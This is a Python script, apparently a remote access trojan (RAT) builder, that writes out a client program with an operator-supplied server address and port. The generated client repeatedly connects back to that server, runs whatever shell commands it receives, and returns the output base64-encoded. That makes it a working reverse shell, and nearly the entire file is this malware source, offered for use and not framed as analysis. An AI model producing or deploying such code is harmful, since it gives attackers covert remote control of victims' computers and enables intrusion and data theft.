#!/usr/bin/env python3
"""
RAT CLIENT BUILDER
"""

import argparse
import os

class RATBuilder:
    def __init__(self):
        self.basic_template = '''#!/usr/bin/env python3
import socket
import subprocess
import os
import json
import base64
import sys
import time

SERVER_HOST = "{server_host}"
SERVER_PORT = {server_port}

class RATClient:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.connected = False
        
    def reliable_send(self, data):
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            json_data = json.dumps(data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else data)
            encoded_data = base64.b64encode(json_data.encode('utf-8'))
            self.socket.send(len(encoded_data).to_bytes(4, 'big') + encoded_data)
            return True
        except: return False

    def reliable_receive(self):
        try:
            raw_len = self.socket.recv(4)
            if not raw_len: return None
            data_len = int.from_bytes(raw_len, 'big')
            data = b''
            while len(data) < data_len:
                packet = self.socket.recv(data_len - len(data))
                if not packet: return None
                data += packet
            decoded_data = base64.b64decode(data)
            return json.loads(decoded_data)
        except: return None

    def connect_to_server(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            self.socket.connect((self.server_host, self.server_port))
            self.connected = True
            return True
        except: return False

    def execute_command(self, command):
        try:
            if command.startswith('cd '):
                os.chdir(command[3:])
                return os.getcwd()
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                return result.stdout if result.stdout else result.stderr
        except Exception as e:
            return str(e)

    def start_client(self):
        while True:
            try:
                if not self.connect_to_server():
                    time.sleep(10)
                    continue
                
                while True:
                    command = self.reliable_receive()
                    if not command: break
                    
                    if command.lower() in ['exit', 'quit']:
                        return
                    
                    result = self.execute_command(command)
                    if not self.reliable_send(result):
                        break
                        
            except: 
                time.sleep(10)

def main():
    client = RATClient(SERVER_HOST, SERVER_PORT)
    client.start_client()

if __name__ == "__main__":
    main()
'''

    def build_client(self, server_host, server_port, output_file, client_type="basic"):
        """Build RAT client"""
        
        if client_type == "basic":
            client_code = self.basic_template.format(
                server_host=server_host,
                server_port=server_port
            )
        else:
            # Add advanced templates here
            client_code = self.basic_template.format(
                server_host=server_host,
                server_port=server_port
            )
        
        # Ensure output directory exists
        os.makedirs(os.path.dirname(output_file), exist_ok=True)
        
        with open(output_file, 'w') as f:
            f.write(client_code)
        
        print(f"[+] Client built: {output_file}")
        print(f"[+] Target server: {server_host}:{server_port}")
        print(f"[+] Client type: {client_type}")

def main():
    parser = argparse.ArgumentParser(description='RAT Client Builder')
    parser.add_argument('--server', required=True, help='Server IP address')
    parser.add_argument('--port', type=int, default=4444, help='Server port')
    parser.add_argument('--output', default='build/client.py', help='Output file')
    parser.add_argument('--type', choices=['basic', 'stealth'], default='basic', help='Client type')
    
    args = parser.parse_args()
    
    builder = RATBuilder()
    builder.build_client(args.server, args.port, args.output, args.type)

if __name__ == "__main__":
    main()